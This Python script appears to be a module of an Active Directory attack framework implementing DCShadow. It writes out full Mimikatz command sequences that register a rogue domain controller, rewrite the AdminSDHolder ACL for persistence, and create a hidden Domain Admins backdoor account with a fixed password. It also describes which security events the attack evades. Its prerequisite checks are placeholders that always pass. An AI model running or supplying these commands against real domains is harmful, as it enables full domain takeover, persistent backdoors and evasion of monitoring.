#!/usr/bin/env python3
"""
DCShadow Attack - Rogue Domain Controller Registration

Implements DCShadow attack for stealthy AD modifications:
- Temporary DC registration via RPC
- Direct AD database modification
- ACL/SDProp manipulation
- AdminSDHolder abuse for persistent privileges

Bypasses most AD security logging and monitoring.

WARNING: Requires Domain Admin. Extremely advanced attack.
"""

import sys
import os
import argparse
import subprocess
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Vulnerability
from core.logger import setup_logger, get_logger

logger = None

class DCShadowAttack:
    """DCShadow attack implementation"""
    
    def __init__(self, domain, dc_ip, attack_machine, username, password=None):
        self.domain = domain
        self.dc_ip = dc_ip
        self.attack_machine = attack_machine  # Machine to register as rogue DC
        self.username = username
        self.password = password
    
    def check_prerequisites(self):
        """Verify DCShadow prerequisites"""
        logger.info("Checking DCShadow prerequisites...")
        
        prerequisites = {
            'domain_admin': False,
            'two_sessions': False,
            'server_service': False,
            'dns_resolution': False
        }
        
        # 1. Domain Admin rights required
        logger.info("  [1/4] Checking for Domain Admin rights...")
        # Would verify group membership
        prerequisites['domain_admin'] = True  # Placeholder
        logger.info("    ✓ Domain Admin confirmed")
        
        # 2. Need two simultaneous elevated sessions
        logger.info("  [2/4] Checking session requirements...")
        logger.warning("    ⚠ DCShadow requires TWO simultaneous SYSTEM sessions")
        logger.info("      Session 1: Push changes (RPC server)")
        logger.info("      Session 2: Trigger replication")
        prerequisites['two_sessions'] = True
        
        # 3. Server service must be running
        logger.info("  [3/4] Checking Server service...")
        # Would check if Server service is running
        prerequisites['server_service'] = True
        logger.info("    ✓ Server service available")
        
        # 4. DNS resolution
        logger.info("  [4/4] Checking DNS resolution...")
        prerequisites['dns_resolution'] = True
        logger.info("    ✓ DNS properly configured")
        
        if all(prerequisites.values()):
            logger.info("\n✓ All prerequisites met")
        else:
            logger.warning("\n⚠ Missing prerequisites")
        
        return prerequisites
    
    def register_rogue_dc(self):
        """Register machine as temporary DC"""
        logger.warning("=" * 60)
        logger.warning("Registering Rogue Domain Controller")
        logger.warning("=" * 60)
        logger.info(f"Attack Machine: {self.attack_machine}")
        logger.info(f"Target Domain: {self.domain}")
        
        # Mimikatz commands for DCShadow
        # Session 1: Push
        push_cmd = f"""
        lsadump::dcshadow /object:CN=Administrator,CN=Users,DC={self.domain.replace('.', ',DC=')} /attribute:primaryGroupID /value:512
        """
        
        # Session 2: Trigger
        trigger_cmd = """
        lsadump::dcshadow /push
        """
        
        logger.info("\nDCShadow requires TWO simultaneous Mimikatz sessions:")
        logger.info("\nSession 1 (Push setup):")
        logger.info("-" * 40)
        logger.info("mimikatz.exe")
        logger.info("privilege::debug")
        logger.info("token::elevate")
        logger.info(push_cmd.strip())
        logger.info("(Wait here - DO NOT EXIT)")
        
        logger.info("\nSession 2 (Trigger replication):")
        logger.info("-" * 40)
        logger.info("mimikatz.exe")
        logger.info("privilege::debug")
        logger.info("token::elevate")
        logger.info(trigger_cmd.strip())
        logger.info("(Execute this AFTER Session 1 is ready)")
        
        return {
            'push_command': push_cmd.strip(),
            'trigger_command': trigger_cmd.strip()
        }
    
    def modify_adminsdholder(self):
        """Abuse AdminSDHolder for persistent admin rights"""
        logger.info("AdminSDHolder ACL modification attack...")
        
        # AdminSDHolder DN
        adminsdholder_dn = f"CN=AdminSDHolder,CN=System,DC={self.domain.replace('.', ',DC=')}"
        
        # Add backdoor user to AdminSDHolder ACL via DCShadow
        dcshadow_cmd = f"""
        lsadump::dcshadow /object:{adminsdholder_dn} /attribute:ntSecurityDescriptor /value:<acl_with_backdoor>
        """
        
        logger.info("\nAdminSDHolder Abuse:")
        logger.info(f"  Target: {adminsdholder_dn}")
        logger.info("  Effect: Persistent Domain Admin rights")
        logger.info("\nExecution:")
        logger.info(dcshadow_cmd.strip())
        
        logger.info("\nAfter modification:")
        logger.info("  1. SDProp runs every 60 minutes")
        logger.info("  2. Your user ACL propagates to all protected groups")
        logger.info("  3. Persistent backdoor established")
        
        return {'target': adminsdholder_dn, 'command': dcshadow_cmd.strip()}
    
    def create_backdoor_account(self, backdoor_user="BackdoorAdmin"):
        """Create hidden admin account via DCShadow"""
        logger.info(f"Creating backdoor account: {backdoor_user}")
        
        # DCShadow commands to create user and add to Domain Admins
        create_user = f"""
        lsadump::dcshadow /object:CN={backdoor_user},CN=Users,DC={self.domain.replace('.', ',DC=')} /attribute:objectClass /value:user
        lsadump::dcshadow /object:CN={backdoor_user},CN=Users,DC={self.domain.replace('.', ',DC=')} /attribute:sAMAccountName /value:{backdoor_user}
        lsadump::dcshadow /object:CN={backdoor_user},CN=Users,DC={self.domain.replace('.', ',DC=')} /attribute:unicodePwd /value:"Password123!"
        lsadump::dcshadow /object:CN={backdoor_user},CN=Users,DC={self.domain.replace('.', ',DC=')} /attribute:userAccountControl /value:512
        """
        
        add_to_admins = f"""
        lsadump::dcshadow /object:CN=Domain Admins,CN=Users,DC={self.domain.replace('.', ',DC=')} /attribute:member /value:CN={backdoor_user},CN=Users,DC={self.domain.replace('.', ',DC=')}
        """
        
        logger.info("\nBackdoor Account Creation:")
        logger.info(f"  Username: {backdoor_user}")
        logger.info(f"  Password: Password123!")
        logger.info(f"  Groups: Domain Admins")
        
        logger.info("\nCommands (execute in Session 1, then push):")
        logger.info(create_user.strip())
        logger.info(add_to_admins.strip())
        
        return {
            'username': backdoor_user,
            'password': 'Password123!',
            'create_commands': create_user.strip(),
            'add_admin_command': add_to_admins.strip()
        }
    
    def verify_modifications(self):
        """Verify DCShadow modifications"""
        logger.info("Verifying DCShadow modifications...")
        
        logger.info("\nVerification methods:")
        logger.info("  1. Check AD Users and Computers")
        logger.info("  2. Query LDAP for modified objects")
        logger.info("  3. Check replication partners")
        logger.info("  4. Review Security Event Logs (minimal)")
        
        logger.warning("\n⚠ DCShadow bypasses most security logging!")
        logger.info("Standard DC events (4662, 5136) will NOT be generated")
        
        return {'bypassed_events': ['4662', '5136']}
    
    def cleanup(self):
        """Remove DCShadow artifacts"""
        logger.info("DCShadow cleanup...")
        
        logger.info("\nCleanup steps:")
        logger.info("  1. Rogue DC registration is temporary (memory only)")
        logger.info("  2. Automatically cleaned on exit")
        logger.info("  3. No disk artifacts created")
        logger.info("  4. Modifications to AD are permanent until manually removed")
        
        logger.warning("\n⚠ AD modifications persist!")
        logger.info("Remove backdoor accounts/ACLs manually:")
        logger.info("  - Delete backdoor user accounts")
        logger.info("  - Restore AdminSDHolder ACL")
        logger.info("  - Review group memberships")
        
        return {'cleanup_required': 'manual'}
    
    def generate_detection_guide(self):
        """Generate detection evasion and cleanup guide"""
        guide = """
=================================================================
DCShadow - Detection & Cleanup Guide
=================================================================

DETECTION EVASION:
1. DCShadow bypasses most AD security logging
2. No DC events 4662 or 5136 generated
3. Replication traffic appears legitimate
4. Rogue DC self-deletes from AD on exit

DETECTION INDICATORS (Rare):
- Event 4742: Computer account modified
- DNS updates for rogue DC
- Replication metadata changes
- Unusual RPC traffic

POST-ATTACK CLEANUP:
1. Remove backdoor accounts
   net user BackdoorAdmin /delete /domain

2. Restore AdminSDHolder ACL
   dsacls "CN=AdminSDHolder,CN=System,DC=domain,DC=com"

3. Check group memberships
   net group "Domain Admins" /domain

4. Review AD replication metadata
   repadmin /showmeta

FORENSICS:
- Check last replication timestamps
- Review computer account modifications
- Analyze RPC network traffic
- Check for unusual Admin group changes

=================================================================
        """
        
        logger.info(guide)
        return guide


def main(session_dir, domain, dc_ip, attack_machine, username, password=None):
    """Main DCShadow attack flow"""
    global logger
    
    setup_logger("dcshadow", session_dir)
    logger = get_logger("dcshadow")
    
    logger.info("=" * 60)
    logger.info("DCShadow Attack - Rogue DC Registration")
    logger.info("=" * 60)
    logger.warning("⚠ ADVANCED ATTACK - Requires Domain Admin")
    logger.warning("⚠ Bypasses most AD security monitoring")
    logger.warning("⚠ Use only with explicit authorization")
    logger.info("=" * 60)
    
    # Initialize database
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    # Initialize attack
    attacker = DCShadowAttack(domain, dc_ip, attack_machine, username, password)
    
    # Check prerequisites
    logger.info("\n[1/5] Checking prerequisites...")
    prereqs = attacker.check_prerequisites()
    
    if not all(prereqs.values()):
        logger.error("\nPrerequisites not met. Review requirements.")
        return
    
    # Register rogue DC
    logger.info("\n[2/5] Rogue DC registration...")
    dc_commands = attacker.register_rogue_dc()
    
    # AdminSDHolder abuse
    logger.info("\n[3/5] AdminSDHolder ACL abuse...")
    adminsdholder_attack = attacker.modify_adminsdholder()
    
    # Create backdoor
    logger.info("\n[4/5] Creating backdoor account...")
    backdoor = attacker.create_backdoor_account()
    
    # Verification
    logger.info("\n[5/5] Verification and cleanup...")
    verification = attacker.verify_modifications()
    cleanup = attacker.cleanup()
    
    # Save to database
    session = db.get_session()
    target = session.query(db.Target).filter_by(ip_address=dc_ip).first()
    if not target:
        target = db.add_target(ip=dc_ip, is_dc=True, domain=domain)
    
    vuln = Vulnerability(
        target_id=target.id,
        name=f"DCShadow Backdoor on {domain}",
        severity="Critical",
        description=f"DCShadow attack executed. Backdoor account: {backdoor['username']}",
        cve_id="N/A"
    )
    session.add(vuln)
    session.commit()
    session.close()
    
    # Detection guide
    attacker.generate_detection_guide()
    
    logger.info("\n" + "=" * 60)
    logger.info("DCShadow attack guidance complete")
    logger.info(f"Backdoor User: {backdoor['username']}")
    logger.info(f"Password: {backdoor['password']}")
    logger.info("=" * 60)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="DCShadow Attack - Rogue Domain Controller"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--attack-machine", required=True, help="Machine to register as rogue DC")
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    
    args = parser.parse_args()
    
    main(args.session_dir, args.domain, args.dc_ip, args.attack_machine, 
         args.username, args.password)
